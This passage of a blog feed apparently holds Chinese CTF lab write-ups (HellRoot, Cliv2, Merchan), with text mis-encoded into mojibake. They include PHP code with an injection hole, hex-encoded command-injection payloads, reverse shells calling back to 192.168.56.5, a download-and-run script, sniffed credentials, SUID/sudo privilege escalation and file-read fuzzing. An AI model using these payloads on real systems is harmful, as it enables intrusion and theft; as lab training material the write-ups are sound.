type=\"text\" placeholder=\"example.com\" required autocomplete=\"off\" />\n    <button type=\"submit\">Lookup DNS</button>\n  </form>\n\n<?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['domain'])) {\n    $input = trim($_POST['domain']);\n    $decoded = @hex2bin($input);\n\n    // Always show raw output for debugging\n    ob_start();\n\n    if ($decoded !== false && ctype_print($decoded)) {\n        if (strpos($decoded, ';') !== false) {\n            // Remove header modification that breaks execution\n            $output = shell_exec($decoded . ' 2>&1');\n        } else {\n            $safeDomain = escapeshellarg($decoded);\n            $output = shell_exec(\"nslookup $safeDomain 2>&1\");\n        }\n    } else {\n        $safeDomain = escapeshellarg($input);\n        $output = shell_exec(\"nslookup $safeDomain 2>&1\");\n    }\n\n    echo '<pre class=\"result\">' . htmlspecialchars($output ?: 'No output returned.') . '</pre>';\n    ob_end_flush();\n}\n?>\n```\n\nå¾ˆæ˜æ˜¾å­˜åœ¨ä¸€ä¸ª`RCE` æ¼æ´\n\nè¿™é‡Œæ¥æ”¶æˆ‘ä»¬çš„å‚æ•° `domain` ï¼Œç„¶åå¯¹å…¶è¿›è¡Œ`16`è¿›åˆ¶ç¼–ç \n\n```bash\n$input = trim($_POST['domain']);\n$decoded = @hex2bin($input);\n```\n\nç„¶åä¸‹è¾¹åˆ¤æ–­è§£ç æ˜¯å¦æˆåŠŸï¼Œå’Œæ˜¯å¦ä¸ºå¯ä»¥æ‰“å°å­—ç¬¦\n\nå‡å¦‚æˆ‘ä»¬ç›´æ¥è¾“å…¥å­—ç¬¦åˆ™è¿›å…¥ `else`\n\n```bash\n   if ($decoded !== false && ctype_print($decoded)) {\n        if (strpos($decoded, ';') !== false) {\n            // Remove header modification that breaks execution\n            $output = shell_exec($decoded . ' 2>&1');\n        } else {\n            $safeDomain = escapeshellarg($decoded);\n            $output = shell_exec(\"nslookup $safeDomain 2>&1\");\n        }\n    } else {\n\t\t    // å­—ç¬¦ç›´æ¥è¿›å…¥è¿™é‡Œ\n        $safeDomain = escapeshellarg($input);\n        $output = shell_exec(\"nslookup $safeDomain 2>&1\");\n    }\n```\n\nå‡å¦‚æˆ‘ä»¬è¾“å…¥`16`è¿›åˆ¶ï¼Œå¹¶ä¸”è§£ç æˆåŠŸå°±ä¼šè¿›å…¥\n\n```bash\nif (strpos($decoded, ';') !== false) {\n            // Remove header modification that breaks execution\n            $output = shell_exec($decoded . ' 2>&1');\n        } else {\n            $safeDomain = escapeshellarg($decoded);\n            $output = shell_exec(\"nslookup $safeDomain 2>&1\");\n        }\n```\n\n`$output = shell_exec($decoded . ' 2>&1');` ï¼Œå¦‚æœæ‰¾åˆ°äº†åˆ†å·ï¼Œä»£ç ä¼šç›´æ¥å°†è§£ç åçš„ã€æœªç»ä»»ä½•å¤„ç†çš„å­—ç¬¦ä¸²Â `$decoded`Â ä¼ é€’ç»™Â `shell_exec`Â å‡½æ•°æ‰§è¡Œ\n\næˆ‘ä»¬å°è¯• `google.com;nc 192.168.56.5 80` ï¼Œç„¶åè½¬æ¢ä¸º `16` è¿›åˆ¶\n\n![image.png](/post-images/TheHackersLabsHellRoot/image7.png)\n\nå‚æ•°å¡«å…¥ `domian` å‚æ•°åæˆåŠŸæ‰§è¡Œ\n\n![image.png](/post-images/TheHackersLabsHellRoot/image8.png)\n\nè¿›è¡Œåå¼¹ `shell`\n\n```bash\ngoogle.com;nc 192.168.56.5 1234 -e /bin/bash\n// To hex\n676f6f676c652e636f6d3b6e63203139322e3136382e35362e352031323334202d65202f62696e2f62617368\n```\n\n![image.png](/post-images/TheHackersLabsHellRoot/image9.png)\n\n## ç½‘ç»œå—…æ¢\n\nå½“å‰æˆ‘ä»¬åœ¨ `Docker` ç¯å¢ƒé‡Œé¢\n\n```bash\nwww-data@05cc10128c04:/home$ ls -la /\ntotal 64\ndrwxr-xr-x   1 root root 4096 Jul 19 12:49 .\ndrwxr-xr-x   1 root root 4096 Jul 19 12:49 ..\n-rwxr-xr-x   1 root root    0 Jul 19 12:49 .dockerenv\n```\n\næ‰¾åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶\n\n```bash\nwww-data@05cc10128c04:/var/www/html$ cat sniff.txt \nPuede que haya ciertas herramientas que te permitan esnifar el trafico.\n```\n\n> å¯èƒ½å­˜åœ¨æŸäº›å·¥å…·å¯ä»¥è®©ä½ å—…æ¢æµé‡ã€‚\n> \n\néšè—çš„ `.config` æ–‡ä»¶å¤¹\n\n```bash\nwww-data@05cc10128c04:/var/www/html/.config$\n```\n\né‡Œé¢æœ‰ `dpkg` çš„ä¿¡æ¯ï¼Œèƒ½çœ‹åˆ°æœ‰ `tcpdump`\n\n![image.png](/post-images/TheHackersLabsHellRoot/image10.png)\n\nä½¿ç”¨ä¸Šé¢çš„å¾—åˆ°çš„å‡­æ®åˆ‡æ¢ç”¨æˆ·\n\n```bash\nwww-data@05cc10128c04:/home$ su astro \nPassword: \n$ id\nuid=1001(astro) gid=1001(astro) groups=1001(astro)\n```\n\nå†æ ¹æ® `sudo -l` çš„æƒé™ï¼Œå¯ä»¥ç›´æ¥åˆ‡æ¢åˆ° `root`\n\n```bash\n$ sudo -l\nMatching Defaults entries for astro on 05cc10128c04:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser astro may run the following commands on 05cc10128c04:\n    (ALL : ALL) NOPASSWD: /bin/su\n$ sudo su root\nroot@05cc10128c04:/home# \n```\n\næˆ‘ä»¬å†æ ¹æ®ä¸Šè¾¹çš„æ–‡ä»¶è¿›è¡Œç½‘ç»œå—…æ¢\n\n![image.png](/post-images/TheHackersLabsHellRoot/image11.png)\n\nä½†æ˜¯ç›´æ¥æŠ“å¹¶ä¸èƒ½æŠ“åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ï¼Œæƒ³èµ·æ¥ `Gitea` å¯ä»¥è¿›è¡Œç™»å½•\n\nå…ˆæå‰å¼€å¯æŠ“åŒ…ï¼Œç„¶ååœ¨ç½‘ç«™ä¸Šä¸ªä½¿ç”¨å‡­æ®ç™»å½•\n\n```scheme\ntcpdump -i eth0 -A -w 1.pcap\n```\n\n![image.png](/post-images/TheHackersLabsHellRoot/image12.png)\n\nç„¶åç›´æ¥æŸ¥çœ‹æ•°æ®åŒ…ï¼Œèƒ½å¾—åˆ°ä¸€ä¸ªå‡­æ®\n\n![image.png](/post-images/TheHackersLabsHellRoot/image13.png)\n\nä½†ä¸€å¼€å§‹å¹¶æ²¡æƒ³åˆ°è¿™ä¸ªæ˜¯å¯†ç ï¼Œå› ä¸ºæˆ‘è®¤ä¸ºè¿™æ˜¯å‰ç«¯ä¼ è¿‡æ¥åŠ å¯†æ•°æ®\n\nç„¶ååœ¨ `ssh` è¿›è¡Œå¯†ç ç¢°æ’ï¼ŒæˆåŠŸç™»å½•è¿›å»äº†\n\n![image.png](/post-images/TheHackersLabsHellRoot/image14.png)\n\nèƒ½è¯»å–åˆ° `user.txt`\n\n![image.png](/post-images/TheHackersLabsHellRoot/image15.png)\n\n## æƒé™æå‡\n\nå¯»æ‰¾å­˜åœ¨ `suid` æƒé™çš„ç¨‹åº\n\n```scheme\nastro@hellroot:~$ find / -perm -u=s -type f 2>/dev/null\n/usr/local/bin/secmonitor\n/usr/local/bin/logview\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n```\n\næœ‰ä¸¤ä¸ªå¥‡æ€ªçš„ç¨‹åº `logview` å’Œ `secmonitor`\n\n`logview` èƒ½ç›´æ¥è¯»æ–‡ä»¶ï¼Œç›´æ¥è¯» `root.txt`\n\n```scheme\nastro@hellroot:~$ logview ../../root/root.txt\n[logview] Running with administrative privileges\nDisplaying log: /var/log/../../root/root.txt\nf03xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/08/02/TheHackersLabsHellRoot",
            "title": "TheHackersLabs - HellRoot",
            "summary": "HellRoot https://labs.thehackerslabs.com/machine/121 Recon PortScan æ‰«æå‡ºæ¥æœ‰ä¸¤ä¸ª SSH æœåŠ¡ï¼Œä¸‰ä¸ª Web æšä¸¾ 192.168.56.5 æ˜¯ Apache çš„é»˜è®¤é¡µé¢ https://git.hellroot.thl/ æ˜¯ G...",
            "date_modified": "2025-08-02T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Linux",
                "RCE",
                "Logview"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/31/ç¾¤Ué¶æœº - Cliv2",
            "content_html": "\n# ç¾¤Ué¶æœº - Cliv2\n\n## Recon\n\nç«¯å£æ‰«æ\n\n```scheme\nâœ  Test nmap -sT -min-rate 10000 -p- 192.168.56.100\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:37 CST\nNmap scan report for 192.168.56.100\nHost is up (0.00018s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n53/tcp open  domain\n80/tcp open  http\nMAC Address: 08:00:27:EB:7B:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```scheme\n\nâœ  Test nmap -sT -A -p 22,80,53 192.168.56.100     \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:38 CST\nNmap scan report for cliv2.dsz (192.168.56.100)\nHost is up (0.00042s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n53/tcp open  domain  ISC BIND 9.16.50 (Debian Linux)\n| dns-nsid: \n|_  bind.version: 9.16.50-Debian\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: CLIv2 Main\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:EB:7B:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.42 ms cliv2.dsz (192.168.56.100)\n```\n\nå­åŸŸåçˆ†ç ´\n\n```scheme\nâœ  Test ffuf -u 'http://cliv2.dsz/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'host: FUZZ.cliv2.dsz' --fs=3669\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://cliv2.dsz/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.cliv2.dsz\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 3669\n________________________________________________\n\nclient                  [Status: 200, Size: 873, Words: 147, Lines: 42, Duration: 0ms]\ndev                     [Status: 200, Size: 654, Words: 113, Lines: 34, Duration: 315ms]\n```\n\n## DNS åŒºåŸŸä¼ è¾“æ¼æ´\n\nçœ‹åˆ° `dev` å°±å¾ˆå…´å¥‹\n\nç‚¹è¿›å»åçœ‹åˆ° **`AXFR`**\n\n![image.png](/post-images/ç¾¤Ué¶æœº%20-%20Cliv2/image.png)\n\næˆ‘ä¸€æœï¼Œèƒ½æ‰¾åˆ°ï¼š\n\n> **DNS åŒºåŸŸä¼ è¾“ (`AXFR`)**\n> \n> \n> ä½¿ç”¨ AXFR åè®®çš„ DNS åŒºåŸŸä¼ è¾“æ˜¯è·¨ DNS æœåŠ¡å™¨å¤åˆ¶ DNS è®°å½•çš„æœ€ç®€å•æœºåˆ¶ã€‚ä¸ºé¿å…åœ¨å¤šä¸ª DNS æœåŠ¡å™¨ä¸Šç¼–è¾‘ä¿¡æ¯çš„éœ€è¦ï¼Œæ‚¨å¯ä»¥åœ¨ä¸€å°æœåŠ¡å™¨ä¸Šç¼–è¾‘ä¿¡æ¯å¹¶ä½¿ç”¨ AXFR å°†ä¿¡æ¯å¤åˆ¶åˆ°å…¶ä»–æœåŠ¡å™¨ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨ä¸ä¿æŠ¤æ‚¨çš„æœåŠ¡å™¨ï¼Œæ¶æ„æ–¹å¯èƒ½ä¼šä½¿ç”¨ AXFR æ¥è·å–æœ‰å…³æ‚¨æ‰€æœ‰ä¸»æœºçš„ä¿¡æ¯ã€‚\n> \n\né‚£ä¹ˆå®ƒè‚¯å®šæ²¡æœ‰ä¿æŠ¤\n\n```scheme\nâœ  Test dig axfr @192.168.56.100  cliv2.dsz \n\n; <<>> DiG 9.20.9-1-Debian <<>> axfr @192.168.56.100 cliv2.dsz\n; (1 server found)\n;; global options: +cmd\ncliv2.dsz.              86400   IN      SOA     ns1.cliv2.dsz. admin.cliv2.dsz. 2023072601 3600 900 604800 86400\ncliv2.dsz.              86400   IN      A       127.0.0.1\ncliv2.dsz.              86400   IN      NS      ns1.dsz.\n3170a7.cliv2.dsz.       86400   IN      A       127.0.0.1\nclient.cliv2.dsz.       86400   IN      A       127.0.0.1\ndev.cliv2.dsz.          86400   IN      A       127.0.0.1\nns1.cliv2.dsz.          86400   IN      A       127.0.0.1\ncliv2.dsz.              86400   IN      SOA     ns1.cliv2.dsz. admin.cliv2.dsz. 2023072601 3600 900 604800 86400\n;; Query time: 0 msec\n;; SERVER: 192.168.56.100#53(192.168.56.100) (TCP)\n;; WHEN: Thu Jul 31 18:58:51 CST 2025\n;; XFR size: 8 records (messages 1, bytes 264)\n```\n\n## åå¼¹ shell\n\næœ‰å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½\n\n![image.png](/post-images/ç¾¤Ué¶æœº%20-%20Cliv2/image1.png)\n\nä¸èƒ½æœ‰ç©ºæ ¼é™åˆ¶ï¼šä¸å…è®¸ä½¿ç”¨ç©ºæ ¼æˆ–è¿å­—ç¬¦ã€‚æœ€å¤§é•¿åº¦ï¼š64 ä¸ªå­—ç¬¦ã€‚\n\nåœ¨ `Kali` å‡†å¤‡æ¶æ„æ–‡ä»¶ï¼Œå¹¶å¼€å¯ `HTTP` æœåŠ¡å™¨\n\n```scheme\nâœ  Test cat v.sh \n#!/bin/sh\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc 192.168.56.5 1234 >/tmp/f\n```\n\né€šè¿‡ä¸¤æ­¥æ¥æ‹¿åˆ° `shell`\n\n```scheme\ncmd=cd${IFS}/tmp;busybox${IFS}wget${IFS}192.168.56.5/v.sh;ls${IFS}/tmp\ncmd=cd${IFS}/tmp;chmod${IFS}777${IFS}v.sh;./v.sh\n```\n\n![image.png](/post-images/ç¾¤Ué¶æœº%20-%20Cliv2/image2.png)\n\n## æƒé™æå‡\n\n`Linpeas.sh` å‘ç° `bitc0de` å®¶ç›®å½•ä¸­æœ‰ä¸€ä¸ª `â€¦`\n\n```scheme\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Searching root files in home dirs (limit 30)\n/home/\n/home/bitc0de/.bash_history\n/home/bitc0de/...\n/home/bitc0de/user.txt\n/root/\n/var/www\n/var/www/html\n/var/www/html/index.html\n/var/www/cliv2.dsz\n/var/www/cliv2.dsz/index.php\n/var/www/3170a7.cliv2.dsz\n/var/www/3170a7.cliv2.dsz/index.php\n/var/www/client.cliv2.dsz\n/var/www/client.cliv2.dsz/index.php\n/var/www/dev.cliv2.dsz\n/var/www/dev.cliv2.dsz/index.php\n```\n\nè¯»å–æ‹¿åˆ°å¯†ç \n\n```scheme\nwww-data@Cliv2:/home/bitc0de$ cat ...\nMabEwReOmcpG!123\n```\n\nåˆ‡æ¢åˆ° `bitc0de` å¹¶æŸ¥çœ‹ `sudo` æƒé™\n\n```scheme\n\nbitc0de@Cliv2:~$ sudo -l\nMatching Defaults entries for bitc0de on Cliv2:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser bitc0de may run the following commands on Cliv2:\n    (ALL) NOPASSWD: /usr/local/bin/hmvcli\n```\n\n`hmvcli`æ˜¯é€šè¿‡`python`å†™çš„\n\nåˆ†æåå‘ç°å…¶ä¸­æœ‰ä¸€éƒ¨åˆ†ä»£ç æœ‰é—®é¢˜ï¼Œåªè¦å‚æ•°æ˜¯`config` å°±ä¼šè¿è¡Œ `setup.sh`\n\n```scheme\nif args['config']:                              \n    print(\"[*] Ejecutando script de configuraciÃ³n...\")\n    subprocess.run([\"bash\", \"setup.sh\"])  \n    sys.exit(0) \n```\n\næ¢­å“ˆ\n\n```scheme\necho \"chmod +s /bin/bash\" > setup.sh\nchmod +x setup.sh\nsudo hmvcli --config\n```\n\n![image.png](/post-images/ç¾¤Ué¶æœº%20-%20Cliv2/image3.png)\n\n\n## æ€»ç»“\nQè£™ï¼š660930334",
            "url": "https://www.sunsetaction.top/2025/07/31/ç¾¤Ué¶æœº - Cliv2",
            "title": "ç¾¤Ué¶æœº - Cliv2",
            "summary": "ç¾¤Ué¶æœº Cliv2 Recon ç«¯å£æ‰«æ å­åŸŸåçˆ†ç ´ DNS åŒºåŸŸä¼ è¾“æ¼æ´ çœ‹åˆ° dev å°±å¾ˆå…´å¥‹ ç‚¹è¿›å»åçœ‹åˆ° AXFR æˆ‘ä¸€æœï¼Œèƒ½æ‰¾åˆ°ï¼š DNS åŒºåŸŸä¼ è¾“ (AXFR) ä½¿ç”¨ AXFR åè®®çš„ DNS åŒºåŸŸä¼ è¾“æ˜¯è·¨ DNS æœåŠ¡å™¨å¤åˆ¶ DNS è®°å½•çš„æœ€ç®€å•æœºåˆ¶ã€‚ä¸ºé¿å…åœ¨å¤šä¸ª DNS æœåŠ¡å™¨ä¸Šç¼–...",
            "date_modified": "2025-07-31T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "ç¾¤U",
                "Linux",
                "DNS",
                "hvmcli"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/31/TheHackersLabsMerchan",
            "content_html": "\n# Merchan\n\n> https://labs.thehackerslabs.com/machine/109\n> \n\n![image.png](/post-images/TheHackersLabsMerchan/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  Merchan nmap -sT -min-rate 10000 -p- 192.168.56.99\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 12:48 CST\nNmap scan report for 192.168.56.99\nHost is up (0.00078s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:1C:7F:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.81 seconds\n```\n\n```bash\nâœ  Merchan nmap -sT -A -p 22,80 192.168.56.99                                                \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 12:49 CST\nNmap scan report for 192.168.56.99\nHost is up (0.00048s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)\n| ssh-hostkey: \n|   256 da:68:54:15:39:b8:44:ed:b9:08:4c:59:e5:89:50:08 (ECDSA)\n|_  256 b4:7d:98:a8:01:e8:3b:17:43:24:43:39:3a:b4:b8:50 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62\n|_http-title: Did not follow redirect to http://merchan.thl\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:1C:7F:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.48 ms 192.168.56.99\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.52 seconds\n```\n\n## Web\n\n### å­åŸŸå & ç›®å½• çˆ†ç ´\n\nè®¿é—® `HTTP` ï¼Œè¿™ä¸ªé¡µé¢ä»€ä¹ˆåŠŸèƒ½ç‚¹éƒ½æ²¡æœ‰\n\n![image.png](/post-images/TheHackersLabsMerchan/image1.png)\n\nå°è¯•çˆ†ç ´ä¸€ä¸‹å­åŸŸåï¼Œåªæœ‰ `www`\n\n```bash\nâœ  Merchan ffuf -u 'http://merchan.thl/' -H 'host: FUZZ.merchan.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fw=18 \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://merchan.thl/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.merchan.thl\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response words: 18\n________________________________________________\n\nwww                     [Status: 200, Size: 7235, Words: 2986, Lines: 131, Duration: 866ms]\n:: Progress: [114442/114442] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:54] :: Errors: 0 ::\n```\n\nç›®å½•çˆ†ç ´ï¼Œèƒ½æ‰«æå‡ºæ¥ä¸€ä¸ª `secret.js`\n\n```bash\nâœ  Merchan feroxbuster --url http://merchan.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x js,txt,zip\n...\n404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n301      GET        9l       28w      311c http://merchan.thl/images => http://merchan.thl/images/\n200      GET        7l       36w      330c http://merchan.thl/js/scripts.js\n200      GET    10826l    22299w   236792c http://merchan.thl/css/styles.css\n301      GET        9l       28w      311c http://merchan.thl/assets => http://merchan.thl/assets/\n301      GET        9l       28w      308c http://merchan.thl/css => http://merchan.thl/css/\n301      GET        9l       28w      307c http://merchan.thl/js => http://merchan.thl/js/\n200      GET        8l       29w    28898c http://merchan.thl/assets/favicon.ico\n200      GET      563l     3920w   380306c http://merchan.thl/images/sudadera.png\n200      GET      139l      592w    68236c http://merchan.thl/images/camiseta.jpg\n200      GET      186l      943w    74237c http://merchan.thl/images/llavero.jpg\n200      GET      130l      399w     7235c http://merchan.thl/\n200      GET        1l       15w     1365c http://merchan.thl/secret.js\n```\n\nè¢«æ··æ·†è¿‡äº†\n\n![image.png](/post-images/TheHackersLabsMerchan/image2.png)\n\nç›´æ¥é€šè¿‡ AI å¤åŸå³å¯\n\n```bash\nfunction createLink(){\n    const _0xd35862 = _0x4b23, // _0xd35862 æ˜¯è§£ç å‡½æ•°çš„åˆ«å\n          _0x398463 = '2e81eb4e952a3268babddecad2a4ec1e.php',\n          _0x199a7f = document[_0xd35862(0x17b)]('a');\n\n    _0x199a7f[_0xd35862(0x17d)] = _0xd35862(0x171);\n    _0x199a7f[_0xd35862(0x177)] = _0x398463;\n    document[_0xd35862(0x174)][_0xd35862(0x179)](_0x199a7f);\n}\n_0xd35862(0x17b) -> è§£ç åæ˜¯ 'createElement'\n_0xd35862(0x17d) -> è§£ç åæ˜¯ 'innerText'\n_0xd35862(0x171) -> è§£ç åæ˜¯ 'Haga\\x20click\\x20aqui' (å³ \"Haga click aqui\")\n_0xd35862(0x177) -> è§£ç åæ˜¯ 'href'\n_0xd35862(0x174) -> è§£ç åæ˜¯ 'body'\n_0xd35862(0x179) -> è§£ç åæ˜¯ 'appendChild'\n```\n\nä¹Ÿå°±æ˜¯ä¼šæ‰“å¼€ `2e81eb4e952a3268babddecad2a4ec1e.php`\n\nä½†æ˜¯æˆ‘ä»¬è·³è½¬åå‘ç°ï¼Œè¿˜æ˜¯ä¼šæç¤º `403` ï¼ˆä»»ä½• `php` é¡µé¢éƒ½æ˜¯ï¼‰\n\n![image.png](/post-images/TheHackersLabsMerchan/image3.png)\n\nå°è¯•`bypass403` ï¼Œç›´æ¥åŠ ä¸Šæ–œæ å³å¯\n\n![image.png](/post-images/TheHackersLabsMerchan/image4.png)\n\nä½†æ˜¯è®¿é—®è¿˜æ˜¯ç©ºç™½çš„\n\n![image.png](/post-images/TheHackersLabsMerchan/image5.png)\n\n### æ¨¡ç³Šæµ‹è¯•\n\næˆ‘ä»¬å¯¹å…¶è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œé¦–å…ˆæµ‹è¯•ä»»æ„æ–‡ä»¶è¯»å–\n\nä½†æ˜¯åŠ ä¸Šå‚æ•°åï¼Œè¿˜æ˜¯æç¤ºäº† `403`\n\n```bash\nhttp://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd\n```\n\nå†æ¬¡è¿›è¡Œç»•è¿‡\n\nè¿™é‡Œå·¥å…·å¹¶æ— æ³•è¿›è¡Œç»•è¿‡äº†\n\n![image.png](/post-images/TheHackersLabsMerchan/image6.png)\n\næˆ‘ä»¬è¿›è¡Œæ‰‹åŠ¨ç»•è¿‡ï¼Œæœ€ååŠ ä¸Š `Referer` å³å¯ç»•è¿‡\n\n![image.png](/post-images/TheHackersLabsMerchan/image7.png)\n\næˆ‘ä»¬å†æ¬¡è¿›è¡Œ\n\n```bash\nâœ  Merchan ffuf -u 'http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -H 'Referer: http://merchan.thl/' --fs=0\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Header           : Referer: http://merchan.thl/\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 0\n________________________________________________\n\nfile                    [Status: 200, Size: 1187, Words: 27, Lines: 23, Duration: 0ms]\n```\n\n### ä»»æ„æ–‡ä»¶è¯»å– & å¯†ç çˆ†ç ´\n\næšä¸¾å‡ºæ¥å‚æ•° `file`\n\n![image.png](/post-images/TheHackersLabsMerchan/image8.png)\n\næˆ‘ä»¬è¯»å– `2e81eb4e952a3268babddecad2a4ec1e.php` çš„æºç \n\n```bash\n<?php<br />\n$file = $_GET['file'] ?? '';<br />\nif ($file) {<br />\necho nl2br(file_get_contents($file));<br />\n}<br />\n?><br 